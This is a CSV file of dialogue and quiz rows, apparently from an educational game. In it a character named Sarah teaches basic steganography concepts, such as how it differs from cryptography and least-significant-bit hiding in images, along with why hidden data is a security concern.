525,Sarah,QUESTION,default,What is the difference between Steganography and Cryptography?,"Steganography hides the existence of the message. Cryptography scrambles it -> 527; Steganography is for computers, Cryptography is for phones -> 526",,0,Manager Office,manageroffice
526,Sarah,TEXT,concerned,Hint: No. Remember the Invisible Ink vs The Secret Code. Try again.,,525,0,Manager Office,retry
527,Sarah,TEXT,happy,Correct.,,528,10,Manager Office,manageroffice
528,Sarah,QUESTION,default,What is the most common way to hide data in an image?,Changing the file name -> 529; Modifying the Least Significant Bit (LSB) of the pixels -> 530,,0,Manager Office,manageroffice
529,Sarah,TEXT,concerned,Hint: Changing the file name doesn't hide data *inside* the image content. It's about the pixels. Try again.,,528,0,Manager Office,retry
530,Sarah,TEXT,happy,Correct. Tweaking the colors just slightly.,,531,10,Manager Office,manageroffice
531,Sarah,QUESTION,default,Why is this dangerous?,"It makes images look ugly -> 532; It allows for covert communication, hidden malware, and data theft -> 533",,0,Manager Office,manageroffice

535,Sarah,TEXT,concerned,Hint: We can't ban all images. The business would stop. We need a technical solution.,,534,0,Manager Office,retry

537,Alex,TEXT,happy,Thanks Sarah. I actually understood all of that.,,538,0,Manager Office,manageroffice
538,Sarah,TEXT,default,You did well. Steganography is a tricky subject because it feels like magic.,,539,0,Manager Office,manageroffice
539,Sarah,TEXT,default,But it's just math. And good defense is just better math.,,540,0,Manager Office,manageroffice

606,System,TEXT,default,Incorrect. Printing converts the digital pixels to physical ink. The digital bits are lost.,,605,0,End Screen,ends
